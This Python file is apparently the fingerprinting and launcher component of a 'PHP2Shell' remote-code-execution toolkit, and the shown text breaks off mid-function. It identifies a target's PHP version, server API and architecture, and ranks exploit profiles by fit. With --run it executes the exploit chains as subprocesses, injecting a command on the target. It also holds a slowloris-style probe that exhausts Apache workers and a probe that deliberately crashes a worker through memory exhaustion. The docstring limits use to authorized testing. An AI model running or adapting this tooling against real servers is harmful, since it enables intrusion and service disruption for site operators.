#!/usr/bin/env python3
"""Fingerprint a PHP target and select a known PHP2Shell build profile.

Passive mode (default) reads the target response, Server/X-Powered-By headers,
cookies and common version hints.  Active probes are opt-in:

  --active       small session.upload_progress probe; no OOM
  --oom-probe    one controlled OOM to read memory_limit (destructive to a
                 worker and only appropriate on an authorized lab)

Only run --run and the exploit against systems you own or have explicit
written permission to test.  One target per invocation; this is not a scanner.
"""
from __future__ import annotations

import argparse
import http.client
import json
import re
import secrets
import ssl
import subprocess
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from profile_db import (
    ROOT,
    list_profiles,
    load_profile,
    match_profiles,
    normalize_arch,
    priority_candidates,
    profile_command,
    profile_requirements_ok,
    recommended_huge_mb,
)
from production_exploit import VERSION_OFFSETS, open_socket
from fpm_db import (
    command as fpm_command,
    format_matches as format_fpm_matches,
    list_fpm_profiles,
    load_fpm_profile,
    match_fpm_profiles,
    requirements as fpm_requirements,
)
from session_exploit import build_multipart


# ---------------------------------------------------------------------------
# HTTP


@dataclass
class ProbeResponse:
    url: str
    status: int
    reason: str
    headers: list[tuple[str, str]]
    body: bytes
    redirects: list[str] = field(default_factory=list)

    def values(self, name: str) -> list[str]:
        key = name.lower()
        return [v for k, v in self.headers if k.lower() == key]

    def header(self, name: str, default: str = "") -> str:
        vals = self.values(name)
        return vals[-1] if vals else default

    @property
    def set_cookies(self) -> list[str]:
        return self.values("set-cookie")

    @property
    def text(self) -> str:
        return self.body.decode("latin1", "replace")


class HttpClient:
    def __init__(self, url: str, *, timeout: float = 10.0,
                 insecure: bool = False, max_body: int = 1 << 20):
        self.url = url
        self.timeout = timeout
        self.insecure = insecure
        self.max_body = max_body

    def _connection(self, parts: urllib.parse.SplitResult):
        context = None
        if parts.scheme == "https":
            context = ssl.create_default_context()
            if self.insecure:
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
        port = parts.port or (443 if parts.scheme == "https" else 80)
        if parts.scheme == "https":
            return http.client.HTTPSConnection(parts.hostname, port,
                                               timeout=self.timeout,
                                               context=context)
        return http.client.HTTPConnection(parts.hostname, port,
                                          timeout=self.timeout)

    def request(self, method: str, path: str | None = None,
                body: bytes | None = None,
                headers: dict[str, str] | None = None,
                *, follow: bool = True,
                max_redirects: int = 4) -> ProbeResponse:
        current = path or self.url
        method = method.upper()
        redirects: list[str] = []
        for _ in range(max_redirects + 1):
            parts = urllib.parse.urlsplit(current)
            if parts.scheme not in ("http", "https") or not parts.hostname:
                raise ValueError(f"unsupported URL {current!r}")
            target = parts.path or "/"
            if parts.query:
                target += "?" + parts.query
            hdrs = {
                "User-Agent": "php2shell-fingerprint/0.1",
                "Accept": "*/*",
                "Connection": "close",
            }
            hdrs.update(headers or {})
            conn = self._connection(parts)
            try:
                conn.request(method, target, body=body, headers=hdrs)
                resp = conn.getresponse()
                data = resp.read(self.max_body)
                result = ProbeResponse(
                    current, resp.status, resp.reason,
                    list(resp.getheaders()), data, redirects)
            finally:
                conn.close()
            location = result.header("location")
            if (follow and method in ("GET", "HEAD") and
                    result.status in (301, 302, 303, 307, 308) and location):
                current = urllib.parse.urljoin(current, location)
                redirects.append(current)
                continue
            return result
        raise RuntimeError("too many redirects")


# ---------------------------------------------------------------------------
# Active worker-count probe


def _tls_context(insecure: bool) -> ssl.SSLContext:
    context = ssl.create_default_context()
    if insecure:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    return context


def probe_prefork_workers(url: str, *, insecure: bool = False,
                          limit: int = 256,
                          probe_timeout: float = 3.0) -> int | None:
    """Measure the Apache prefork pool without sending a complete request.

    Each holder sends multipart headers and one byte of a declared 1 MiB body,
    tying up one prefork child.  A separate GET succeeds exactly while at least
    one child remains free.  Binary search over the number of holders recovers
    MaxRequestWorkers.  The probe is disruptive for the duration of the search
    but does not OOM or modify target files.
    """
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https") or not parts.hostname:
        return None
    host = parts.hostname
    port = parts.port or (443 if parts.scheme == "https" else 80)
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    host_header = host if port in (80, 443) else f"{host}:{port}"
    tls = _tls_context(insecure) if parts.scheme == "https" else None
    holders: list[Any] = []

    def hold_one() -> None:
        sock = open_socket(host, port, 2.0, tls, host)
        try:
            sock.sendall(
                f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 1048576\r\n\r\nx".encode())
        except OSError:
            sock.close()
            raise
        holders.append(sock)

    def has_free(count: int) -> bool:
        try:
            for _ in range(count):
                hold_one()
            time.sleep(2.0)
            probe = HttpClient(url, timeout=probe_timeout,
                               insecure=insecure, max_body=4096)
            try:
                probe.request("GET", follow=False)
                return True
            except (OSError, http.client.HTTPException, ValueError):
                return False
        except OSError:
            return False
        finally:
            for sock in holders:
                try:
                    sock.close()
                except OSError:
                    pass
            holders.clear()

    if not has_free(1):
        return 1
    low, high = 1, limit
    while low < high:
        mid = (low + high + 1) // 2
        if has_free(mid):
            low = mid
        else:
            high = mid - 1
    return limit if low >= limit else low + 1


# ---------------------------------------------------------------------------
# Passive parsing


_VERSION_PATTERNS = (
    re.compile(r"PHP/(\d+\.\d+\.\d+)"),
    re.compile(r"PHP\s+Version\s*[:\s]\s*(\d+\.\d+\.\d+)", re.I),
    re.compile(r"PHP\s+(\d+\.\d+\.\d+)", re.I),
    re.compile(r"\bversion=(\d+\.\d+\.\d+)", re.I),
)
_OS_PATTERNS = (
    re.compile(r"\((Debian|Ubuntu|Alpine|CentOS|Red Hat|Amazon|openSUSE|FreeBSD|Win32|Win64|Unix)[^)]*\)", re.I),
    re.compile(r"\b(Debian|Ubuntu|Alpine|CentOS|Red Hat|Amazon|openSUSE|FreeBSD|Windows)\b", re.I),
)
_COOKIE_RE = re.compile(r"(?:^|;\s*)([^=;\s]+)=")
_ARCH_PATTERNS = (
    re.compile(r"\b(x86_64|amd64)\b", re.I),
    re.compile(r"\b(aarch64|arm64)\b", re.I),
)
_WORKER_HEADERS = ("x-workers", "x-worker-count", "x-prefork-workers",
                   "x-max-workers")
_WORKER_BODY_RE = re.compile(
    r"\b(?:MaxRequestWorkers|prefork\s+workers?)\s*[=:]\s*(\d{1,4})",
    re.I)


def _first_version(texts: list[str]) -> str | None:
    for text in texts:
        for pattern in _VERSION_PATTERNS:
            m = pattern.search(text)
            if m:
                return m.group(1)
    return None


def parse_passive(resp: ProbeResponse) -> dict[str, Any]:
    server = resp.header("server")
    xpb = resp.header("x-powered-by")
    via = resp.header("via")
    body = resp.text
    cookies: list[str] = []
    for value in resp.set_cookies:
        cookies.extend(_COOKIE_RE.findall(value))
    cookies = sorted(set(cookies))

    version = _first_version([xpb, server, body])
    php_seen = bool(version or "PHPSESSID" in cookies or
                    "PHPSESSID" in body or "PHP" in xpb.upper() or
                    ".php" in resp.url.lower())
    distro = "unknown"
    for pattern in _OS_PATTERNS:
        m = pattern.search(server)
        if m:
            distro = m.group(1).lower()
            break

    server_lower = server.lower()
    body_sapi = ""
    m = re.search(r"\bsapi=([A-Za-z0-9_-]+)", body)
    if m:
        body_sapi = m.group(1).lower()
    if body_sapi == "apache2handler":
        sapi_hint = "apache"
        sapi = "apache2handler"
        sapi_detail = "application reports Apache mod_php"
    elif body_sapi == "fpm-fcgi":
        sapi_hint = "fpm"
        sapi = "fpm-fcgi"
        sapi_detail = "application reports PHP-FPM FastCGI"
    elif body_sapi == "cli-server":
        sapi_hint = "cli-server"
        sapi = "cli-server"
        sapi_detail = "application reports PHP built-in CLI server"
    elif "development server" in server_lower or body_sapi == "cli-server":
        sapi_hint = "cli-server"
        sapi = "cli-server"
        sapi_detail = "PHP built-in CLI server; single persistent worker"
    elif "apache" in server_lower:
        sapi_hint = "apache"
        sapi = "apache2handler"
        sapi_detail = "Apache; mod_php vs proxy_fcgi is not proven remotely"
    elif "nginx" in server_lower:
        sapi_hint = "nginx"
        sapi = "fpm-fcgi"
        sapi_detail = "nginx; likely PHP-FPM over FastCGI"
    elif "litespeed" in server_lower:
        sapi_hint = "litespeed"
        sapi = "unknown"
        sapi_detail = "LiteSpeed; SAPI not mod_php"
    elif "microsoft-iis" in server_lower:
        sapi_hint = "iis"
        sapi = "unknown"
        sapi_detail = "IIS; FastCGI/other, not mod_php"
    elif body_sapi:
        sapi_hint = "unknown"
        sapi = body_sapi
        sapi_detail = f"body reported SAPI {body_sapi}"
    else:
        sapi_hint = "unknown"
        sapi = "unknown"
        sapi_detail = "server product not recognised"

    title = ""
    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
    if m:
        title = re.sub(r"\s+", " ", m.group(1)).strip()[:200]
    generator = ""
    m = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)',
                  body, re.I)
    if m:
        generator = m.group(1)[:120]

    arch_hint = ""
    for text in (server, xpb, via, body):
        for pattern in _ARCH_PATTERNS:
            m = pattern.search(text)
            if m:
                arch_hint = m.group(1)
                break
        if arch_hint:
            break

    workers_hint = None
    for name in _WORKER_HEADERS:
        value = resp.header(name).strip()
        if value.isdigit() and int(value) > 0:
            workers_hint = int(value)
            break
    if workers_hint is None:
        m = _WORKER_BODY_RE.search(body)
        if m:
            workers_hint = int(m.group(1))

    return {
        "requested_url": resp.url,
        "status": resp.status,
        "server": server,
        "server_software": server.split()[0] if server else "",
        "x_powered_by": xpb,
        "via": via,
        "php_seen": php_seen,
        "php_version": version,
        "php_exposed": bool(version),
        "distro": distro,
        "arch_hint": arch_hint,
        "workers_hint": workers_hint,
        "sapi_hint": sapi_hint,
        "sapi": sapi,
        "sapi_detail": sapi_detail,
        "cookies": cookies,
        "session_cookie": "PHPSESSID" in cookies or "PHPSESSID" in body,
        "title": title,
        "generator": generator,
        "redirects": resp.redirects,
        "headers": {
            "server": server,
            "x-powered-by": xpb,
            "via": via,
            "content-type": resp.header("content-type"),
            "set-cookie": resp.set_cookies[:8],
        },
    }


# ---------------------------------------------------------------------------
# Active probes


def _probe_parts(progress: bool = True) -> tuple[list[dict], bytes]:
    boundary = ("----p2s" + secrets.token_hex(8)).encode()
    sid = secrets.token_hex(13)
    parts: list[dict] = [
        {"name": "PHPSESSID", "data": sid.encode()},
    ]
    if progress:
        parts.append({
            "name": "PHP_SESSION_UPLOAD_PROGRESS",
            "data": ("p2s" + secrets.token_hex(4)).encode(),
        })
    parts.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
    return parts, boundary


def probe_session_upload(client: HttpClient, path: str | None) -> dict[str, Any]:
    """Small upload-progress probe; no OOM and no large field."""
    out: dict[str, Any] = {}
    last_error = ""
    for label, use_progress in (("probe", True), ("control", False)):
        parts, boundary = _probe_parts(use_progress)
        body = build_multipart(parts, boundary)
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
            "Content-Length": str(len(body)),
        }
        try:
            resp = client.request("POST", path, body, headers, follow=False)
        except (OSError, http.client.HTTPException, ValueError) as exc:
            out[label] = {"error": repr(exc)}
            last_error = repr(exc)
            continue
        set_cookie = [v for v in resp.set_cookies
                      if v.lower().startswith("phpsessid=")]
        out[label] = {
            "status": resp.status,
            "set_cookie": bool(set_cookie),
            "set_cookie_value": set_cookie[0][:160] if set_cookie else "",
        }
    probe = out.get("probe") or {}
    control = out.get("control") or {}
    if probe.get("set_cookie") and not control.get("set_cookie"):
        enabled: bool | None = True
    elif probe.get("set_cookie") and control.get("set_cookie"):
        enabled = None
    elif "error" in probe and "error" in control:
        enabled = None
    elif probe.get("status") and not probe.get("set_cookie") and \
            control.get("status") and not control.get("set_cookie"):
        # The endpoint did not start a session for either request. This is
        # consistent with upload_progress disabled, but not proof.
        enabled = None
    else:
        enabled = False if probe.get("status") and not probe.get("set_cookie") else None
    out["enabled"] = enabled
    out["note"] = ("upload_progress probe requires a session-starting endpoint"
                   if enabled is None else "")
    if last_error:
        out["last_error"] = last_error
    return out


def probe_memory_limit(client: HttpClient, path: str | None,
                       probe_mb: int) -> dict[str, Any]:
    """One controlled OOM. Only for an authorized lab."""
    parts, boundary = _probe_parts(True)
    parts.append({"name": "big", "data": b"B" * (probe_mb << 20)})
    body = build_multipart(parts, boundary)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
        "Content-Length": str(len(body)),
    }
    try:
        resp = client.request("POST", path, body, headers, follow=False)
    except (OSError, http.client.HTTPException, ValueError) as exc:
        return {"error": repr(exc), "probe_mb": probe_mb}
    text = resp.text
    m = re.search(r"Allowed memory size of (\d+) bytes exhausted", text)
    limit = int(m.group(1)) if m else None
    if limit is None:
        m = re.search(r"memory_limit[^0-9]{0,40}(\d+)", text, re.I)
        if m:
            limit = int(m.group(1))
    return {
        "probe_mb": probe_mb,
        "status": resp.status,
        "limit_bytes": limit,
        "evidence": text[:500],
    }


# ---------------------------------------------------------------------------
# Output / selection


def _candidate_rows(matches: list[dict[str, Any]]) -> list[str]:
    rows = []
    for m in matches:
        flags = []
        if m.get("rce"):
            flags.append("RCE")
        if m.get("verified"):
            flags.append("verified")
        if not m.get("compatible"):
            flags.append("incompatible")
        command = ""
        if m.get("compatible") and m.get("rce") and profile_requirements_ok(m)[0]:
            command = " ".join(profile_command(
                m, "<url>", "<cmd>", "<proof>", python="python3",
                huge_mb=m.get("recommended_huge_mb")))
        rows.append(
            f"{m['name']:<40} score={m['score']:<4} "
            f"{' '.join(flags):<24} {m.get('status', '')}")
        if command:
            rows.append(f"    {command}")
        for warning in m.get("warnings") or []:
            rows.append(f"    ! {warning}")
    return rows


def _ver_tuple(version: str | None) -> tuple[int, ...]:
    if not version:
        return ()
    try:
        return tuple(int(part) for part in version.split("."))
    except ValueError:
        return ()


def _production_profile(version: str) -> dict[str, Any]:
    return {
        "name": f"php-{version}-prod-x86_64",
        "php_version": version,
        "branch": "8.4",
        "arch": "x86_64",
        "distro": "debian",
        "sapi": "apache2handler",
        "sapi_hint": "apache",
        "rce": True,
        "verified": True,
        "chain": "production",
        "production": {"version": version},
        "config": {
            "memory_limit": 134217728,
            "post_max_size": 8388608,
            "display_errors": "Off",
            "output_buffering": 4096,
        },
        "status": "stock php.ini-production; production_exploit.py",
    }


def production_candidates(fingerprint: dict[str, Any],
                          arch: str | None = None) -> list[dict[str, Any]]:
    """Return stock-production 8.4 profiles in exact-build priority order.

    These profiles intentionally do not use the session-chain profile schema:
    production_exploit.py is a separate chain and is run with --version.
    """
    fp = fingerprint
    target_php = fp.get("php_version")
    target_ver = _ver_tuple(target_php)
    target_arch = normalize_arch(arch or fp.get("arch"))
    if target_arch and target_arch != "x86_64":
        return []
    if fp.get("sapi") in ("fpm-fcgi", "cli-server"):
        return []
    if (fp.get("sapi_hint") or "").lower() in (
            "nginx", "litespeed", "iis", "cli-server"):
        return []
    if fp.get("session_upload_progress") is False:
        return []

    available = sorted(VERSION_OFFSETS, key=_ver_tuple)
    if target_php:
        if (len(target_ver) < 3 or target_ver[:2] != (8, 4) or
                target_ver < (8, 4, 19) or target_ver > (8, 4, 26)):
            return []
        ordered = [target_php] + [
            v for v in sorted(
                (v for v in available if v != target_php),
                key=lambda v: (abs(_ver_tuple(v)[2] - target_ver[2]), v))
        ]
    else:
        ordered = list(reversed(available))
    return [_production_profile(v) for v in ordered]


def production_command(profile: dict[str, Any], url: str,
                       args: argparse.Namespace,
                       workers: int) -> list[str]:
    parts = urllib.parse.urlsplit(url)
    host = parts.hostname or "127.0.0.1"
    scheme = parts.scheme.lower()
    port = parts.port or (443 if scheme == "https" else 80)
    cmd = args.cmd
    if args.response_proof:
        if cmd == "id>/tmp/p2s-proof":
            cmd = "id"
    elif cmd == "id>/tmp/p2s-proof":
        cmd = "id>/out/p1"
    argv = [
        sys.executable,
        str(ROOT / "production_exploit.py"),
        "--host", host,
        "--port", str(port),
        "--workers", str(workers),
        "--version", profile["php_version"],
        "--arch", "x86_64",
        "--cmd", cmd,
        "--host-proof", args.proof_file,
        "--timeout", str(max(60.0, args.timeout)),
    ]
    if args.response_proof:
        argv += ["--response-proof",
                 "--response-marker", args.response_marker]
    if scheme == "https":
        argv += ["--https", "--servername", host]
        if args.insecure:
            argv.append("--insecure")
    return argv


def _production_rows(candidates: list[dict[str, Any]]) -> list[str]:
    rows = []
    for candidate in candidates:
        rows.append(
            f"{candidate['name']:<40} stock-production RCE "
            f"{candidate['php_version']}")
    return rows


def auto_candidates(fp: dict[str, Any], args: argparse.Namespace,
                    arches: list[str]) -> list[dict[str, Any]]:
    """Expand production profiles across unknown worker counts and arches."""
    known_workers = (args.production_workers or args.workers or
                     fp.get("workers"))
    workers = ([int(known_workers)] if known_workers
               else [1, 2, 150])
    candidates: list[dict[str, Any]] = []
    seen: set[tuple[str, int]] = set()
    for arch in arches:
        for profile in production_candidates(fp, arch):
            for count in workers:
                key = (profile["name"], count)
                if key in seen:
                    continue
                seen.add(key)
                candidates.append(dict(profile, chain="production",
                                       workers=count))
    seen_names: set[str] = set()
    for arch in arches:
        for profile in priority_candidates(fp, arch=arch):
            key = profile["name"]
            if key in seen_names:
                continue
            seen_names.add(key)
            candidates.append(dict(profile, chain="session"))
    return candidates


def _choose_profile(args, matches: list[dict[str, Any]]) -> dict[str, Any]:
    if args.profile:
        chosen = load_profile(args.profile)
        ok, problems = profile_requirements_ok(chosen)
        if not ok:
            raise SystemExit("profile is not runnable: " + "; ".join(problems))
        return chosen
    runnable = [m for m in matches
                if m.get("compatible") and m.get("rce") and
                profile_requirements_ok(m)[0]]
    if not runnable:
        raise SystemExit("no compatible verified RCE profile; run with --active "
                         "and/or supply --arch, or calibrate this build")
    top = runnable[0]
    same_version = [m for m in runnable
                    if m.get("php_version") == top.get("php_version")]
    arches = {m.get("arch") for m in same_version}
    if not args.arch and len(arches) > 1:
        raise SystemExit(
            f"{top['php_version']} has multiple architecture profiles "
            f"({', '.join(sorted(arches))}); pass --arch x86_64 or --arch aarch64")
    return top


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Fingerprint a PHP target and select a PHP2Shell build profile",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("-u", "--url", help="target URL (one host only)")
    ap.add_argument("--arch", choices=("auto", "x86_64", "amd64", "aarch64", "arm64"),
                    default="auto")
    ap.add_argument("--php-version", default=None,
                    help="override the detected PHP version")
    ap.add_argument("--distro", default=None, help="override detected distro")
    ap.add_argument("--sapi", default="auto",
                    choices=("auto", "apache2handler", "fpm-fcgi", "cli-server"),
                    help="override the detected PHP SAPI")
    ap.add_argument("--sapi-hint", default=None,
                    choices=("auto", "apache", "nginx", "litespeed", "iis",
                             "cli-server"),
                    help="override the server-product hint")
    ap.add_argument("--persistent", action="store_true",
                    help="use the nginx/FPM/CLI persistent-SAPI chain")
    ap.add_argument("--builder-url", default=None,
                    help="builder endpoint for the persistent-SAPI chain")
    ap.add_argument("--local-bases", action="store_true",
                    help="persistent chain: read ASLR bases from local /proc maps")
    ap.add_argument("--pid", type=int, default=None,
                    help="persistent chain: local CLI server PID for base lookup")
    ap.add_argument("--workers", type=int, default=None,
                    help="known prefork worker count")
    ap.add_argument("--production-workers", type=int, default=None,
                    help="workers for the stock-production chain "
                         "(defaults to --workers, else 1)")
    ap.add_argument("--memory-limit-mb", type=int, default=None,
                    help="known memory_limit; avoids the OOM probe")
    ap.add_argument("--active", action="store_true",
                    help="run the small non-OOM upload-progress probe")
    ap.add_argument("--oom-probe", action="store_true",
                    help="send one controlled OOM to discover memory_limit")
    ap.add_argument("--probe-mb", type=int, default=12,
                    help="big field size for --oom-probe")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--insecure", action="store_true",
                    help="do not verify TLS certificates (lab only)")
    ap.add_argument("--json", action="store_true",
                    help="emit fingerprint and ranked matches as JSON")
    ap.add_argument("--profile", default=None,
                    help="force a profile name or JSON path")
    ap.add_argument("--list-profiles", action="store_true")
    ap.add_argument("--list-fpm-profiles", action="store_true",
                    help="list nginx/FPM and CLI-server profiles")
    ap.add_argument("--limit", type=int, default=8)
    ap.add_argument("--run", action="store_true",
                    help="run session_exploit.py with the selected profile")
    ap.add_argument("--auto", action="store_true",
                    help="try unknown architecture and worker-count variants; "
                         "with --run, actively probe the Apache prefork pool "
                         "unless --workers/--production-workers is given")
    ap.add_argument("--fallback", action="store_true",
                    help="try the priority profile queue when the exact build is unknown")
    ap.add_argument("--try-all", action="store_true",
                    help="try every runnable profile in priority order")
    ap.add_argument("--max-attempts", type=int, default=4,
                    help="maximum profiles tried with --fallback")
    ap.add_argument("-c", "--cmd", default="id>/tmp/p2s-proof")
    ap.add_argument("--proof-file", default="/tmp/p2s-proof")
    ap.add_argument("--response-proof", action="store_true",
                    help="prove execution from the exploit HTTP response; "
                         "the default command does not write a target file")
    ap.add_argument("--response-marker", default="P2S_RCE",
                    help="marker used by production response proof")
    args = ap.parse_args()

    if args.list_profiles:
        for version in sorted(VERSION_OFFSETS, key=_ver_tuple):
            p = _production_profile(version)
            print(f"{p['name']:<42} {p['php_version']:<9} "
                  f"{p['arch']:<8} RCE stock-production")
        for p in list_profiles():
            flags = "RCE" if p.get("rce") else "-"
            print(f"{p['name']:<42} {p.get('php_version','?'):<9} "
                  f"{p.get('arch','?'):<8} {flags:<3} {p.get('status','')}")
        return 0
    if args.list_fpm_profiles:
        for p in list_fpm_profiles():
            flags = "RCE" if p.get("rce") else "-"
            print(f"{p['name']:<42} {p.get('php_version','?'):<9} "
                  f"{p.get('sapi','?'):<11} {p.get('arch','?'):<8} "
                  f"{flags:<3} {p.get('status','')}")
        return 0
    if not args.url:
        ap.error("-u/--url is required unless --list-profiles is used")

    arch_override = None if args.arch == "auto" else normalize_arch(args.arch)
    client = HttpClient(args.url, timeout=args.timeout, insecure=args.insecure)
    try:
        resp = client.request("GET", follow=True)
    except (OSError, http.client.HTTPException, ValueError) as exc:
        print(f"request failed: {exc}", file=sys.stderr)
        return 2

    fp = parse_passive(resp)
    arch = arch_override or normalize_arch(fp.get("arch_hint"))
    if args.workers is None and fp.get("workers_hint"):
        args.workers = int(fp["workers_hint"])
    fp["arch"] = arch or "unknown"
    fp["workers"] = args.workers
    fp["memory_limit"] = (args.memory_limit_mb << 20
                          if args.memory_limit_mb else None)
    if args.php_version:
        fp["php_version"] = args.php_version
        fp["php_seen"] = True
    if args.distro:
        fp["distro"] = args.distro.lower()
    if args.sapi_hint and args.sapi_hint != "auto":
        fp["sapi_hint"] = args.sapi_hint
        if args.sapi_hint == "nginx":
            fp["sapi"] = "fpm-fcgi"
        elif args.sapi_hint == "cli-server":
            fp["sapi"] = "cli-server"
        elif args.sapi_hint == "apache":
            fp["sapi"] = "apache2handler"
    if args.sapi != "auto":
        fp["sapi"] = args.sapi

    persistent = (args.persistent or
                  fp.get("sapi") in ("fpm-fcgi", "cli-server"))
    fpm_matches: list[dict[str, Any]] = []
    if persistent:
        fpm_matches = match_fpm_profiles(
            fp, sapi=fp.get("sapi"), arch=arch, limit=args.limit,
            local=bool(args.local_bases or args.pid))

    if args.active or args.oom_probe:
        fp["session_probe"] = probe_session_upload(client, None)
        fp["session_upload_progress"] = fp["session_probe"].get("enabled")
    if args.oom_probe:
        fp["memory_probe"] = probe_memory_limit(client, None, args.probe_mb)
        if fp["memory_probe"].get("limit_bytes"):
            fp["memory_limit"] = fp["memory_probe"]["limit_bytes"]

    if (args.auto and args.run and not persistent and not args.profile and
            args.workers is None and args.production_workers is None and
            (fp.get("sapi") == "apache2handler" or
             (fp.get("sapi_hint") or "").lower() == "apache")):
        print("[*] auto: probing Apache prefork worker count", flush=True)
        detected = probe_prefork_workers(args.url, insecure=args.insecure,
                                         probe_timeout=min(3.0, args.timeout))
        if detected:
            args.workers = detected
            fp["workers"] = detected
            print(f"[+] auto: detected workers={detected}", flush=True)
        else:
            print("[!] auto: worker probe failed; will try 1, 2, and 150",
                  flush=True)

    matches = match_profiles(fp, arch=arch, limit=args.limit)
    prod_candidates = ([] if persistent else
                       production_candidates(fp, arch))
    prod_workers = (args.production_workers or args.workers or 1)
    if args.profile:
        forced = load_profile(args.profile)
        # Keep the forced profile first for display, but preserve match metadata
        # when it is in the ranked set.
        forced["score"] = 999
        forced["compatible"] = profile_requirements_ok(forced)[0]
        forced["warnings"] = ["forced by --profile"]
        forced["recommended_huge_mb"] = recommended_huge_mb(
            forced, fp.get("memory_limit"))
        matches = [forced] + [m for m in matches
                              if m.get("name") != forced.get("name")]

    if args.json:
        print(json.dumps({
            "fingerprint": fp,
            "matches": matches,
            "production_matches": prod_candidates,
            "fpm_matches": fpm_matches if persistent else [],
        }, indent=2))
    else:
        print(f"[*] target {args.url} -> {resp.url} HTTP {resp.status}")
        if fp.get("php_version"):
            print(f"[*] PHP {fp['php_version']}"
                  + (" (X-Powered-By/body)" if fp.get("php_exposed") else ""))
        else:
            print("[!] PHP version not exposed; use --php-version or a phpinfo page")
        print(f"[*] server={fp.get('server')!r} distro={fp.get('distro')!r}")
        print(f"[*] SAPI hint={fp.get('sapi_hint')}: {fp.get('sapi_detail')}")
        print(f"[*] SAPI={fp.get('sapi')} chain="
              f"{'persistent' if persistent else 'apache-session'}")
        print(f"[*] arch={fp.get('arch')} workers={fp.get('workers')}")
        if args.active or args.oom_probe:
            print(f"[*] upload_progress={fp.get('session_upload_progress')}")
        if fp.get("memory_limit"):
            print(f"[*] memory_limit={fp['memory_limit']} bytes")
        if persistent:
            print("[*] persistent-SAPI profile matches:")
            for row in format_fpm_matches(fpm_matches):
                print("  " + row)
        else:
            if prod_candidates:
                print(f"[*] stock-production profile matches "
                      f"(workers={prod_workers}):")
                for row in _production_rows(prod_candidates):
                    print("  " + row)
            print("[*] session-chain profile matches:")
            for row in _candidate_rows(matches):
                print("  " + row)

    if args.run and persistent:
        if not args.builder_url:
            print("[-] persistent-SAPI run needs --builder-url (the 64M "
                  "session-file builder endpoint)", file=sys.stderr)
            return 1
        try:
            if args.profile:
                chosen = load_fpm_profile(args.profile)
                ok, problems = fpm_requirements(chosen)
                if not ok:
                    raise ValueError("; ".join(problems))
            else:
                runnable = [p for p in fpm_matches if p.get("compatible")]
                if not runnable:
                    print("[-] no automatically trusted persistent-SAPI profile; "
                          "FPM/CLI profiles are build-specific. Pass --profile "
                          "for the exact image/build, or calibrate a new one.",
                          file=sys.stderr)
                    return 1
                chosen = runnable[0]
            if not chosen.get("rce") or not chosen.get("verified"):
                print("[-] selected persistent profile is not verified RCE",
                      file=sys.stderr)
                return 1
            if fp.get("sapi") == "cli-server" and args.local_bases and not args.pid:
                print("[-] CLI local bases need --pid (or pass --chunk/--pie "
                      "through fpm_exploit.py)", file=sys.stderr)
                return 1
            cmd = args.cmd
            proof = args.proof_file
            if cmd == "id>/tmp/p2s-proof":
                cmd = "id>out/p1"
            if proof == "/tmp/p2s-proof":
                proof = "out/p1"
            command = fpm_command(
                chosen, args.url, args.builder_url, cmd, proof,
                local_bases=args.local_bases, pid=args.pid)
        except (ValueError, OSError) as exc:
            print(f"[-] persistent profile: {exc}", file=sys.stderr)
            return 1
        print(f"[*] persistent chain profile {chosen['name']} "
              f"({chosen.get('sapi')})", flush=True)
        print("[*] running:", " ".join(command), flush=True)
        try:
            Path(args.proof_file).unlink()
        except OSError:
            pass
        try:
            rc = subprocess.run(command).returncode
        except OSError as exc:
            print(f"[-] could not launch persistent exploit: {exc}",
                  file=sys.stderr)
            return 1
        if rc == 0:
            print("[+] persistent chain reported a proof file")
            return 0
        print(f"[-] persistent exploit exited {rc}; no proof", file=sys.stderr)
        return 1

    if args.run:
        if args.profile:
            try:
                chosen = load_profile(args.profile)
                ok, problems = profile_requirements_ok(chosen)
                if not ok:
                    raise ValueError("; ".join(problems))
                candidates = [dict(chosen, chain="session")]
            except (ValueError, SystemExit) as exc:
                print(f"[-] profile: {exc}", file=sys.stderr)
                return 1
        elif args.auto:
            auto_arches = ([arch] if arch else ["x86_64", "aarch64"])
            candidates = auto_candidates(fp, args, auto_arches)
            if not candidates:
                print("[-] auto: no runnable production or session profile for "
                      "the detected target", file=sys.stderr)
                return 1
            prod_worker_values = list(dict.fromkeys(
                str(c["workers"]) for c in candidates
                if c.get("chain") == "production"))
            if not prod_worker_values and fp.get("workers"):
                prod_worker_values = [str(fp["workers"])]
            print(f"[*] auto priority: arches={','.join(auto_arches)} "
                  f"workers={','.join(prod_worker_values) or 'auto'}",
                  flush=True)
            for i, candidate in enumerate(candidates, 1):
                if candidate.get("chain") == "production":
                    print(f"  {i}. {candidate['name']} "
                          f"({candidate['php_version']}/x86_64, "
                          f"stock-production, workers={candidate['workers']})")
                else:
                    print(f"  {i}. {candidate['name']} "
                          f"({candidate['php_version']}/"
                          f"{candidate['arch']}, session-chain)")
        elif args.fallback or args.try_all:
            session_candidates = [
                dict(candidate, chain="session")
                for candidate in priority_candidates(fp, arch=arch)
            ]
            candidates = [
                dict(candidate, chain="production")
                for candidate in prod_candidates
            ] + session_candidates
            if args.try_all:
                cap = len(candidates)
            else:
                cap = max(1, args.max_attempts)
            candidates = candidates[:cap]
            if not candidates:
                print("[-] no runnable fallback profiles: known patched version, "
                      "non-mod_php SAPI, disabled upload_progress, multi-worker "
                      "target, or no complete RCE profile", file=sys.stderr)
                return 1
            print("[*] fallback priority:")
            for i, candidate in enumerate(candidates, 1):
                if candidate.get("chain") == "production":
                    print(f"  {i}. {candidate['name']} "
                          f"({candidate['php_version']}/x86_64, "
                          f"stock-production)")
                else:
                    print(f"  {i}. {candidate['name']} "
                          f"({candidate['php_version']}/"
                          f"{candidate['arch']}, session-chain)")
        else:
            if prod_candidates:
                candidates = [dict(prod_candidates[0], chain="production")]
            else:
                try:
                    chosen = _choose_profile(args, matches)
                except SystemExit as exc:
